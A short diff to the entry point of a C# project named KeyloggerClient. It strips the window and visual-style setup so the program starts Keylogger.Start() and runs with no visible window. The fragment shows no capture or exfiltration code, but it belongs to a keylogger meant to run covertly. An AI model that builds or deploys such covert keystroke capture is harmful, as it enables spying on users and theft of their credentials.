@@ -5,11 +5,8 @@ namespace KeyloggerClient
 {
     static class Program
     {
-        [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
             Keylogger.Start();
             Application.Run();
         }
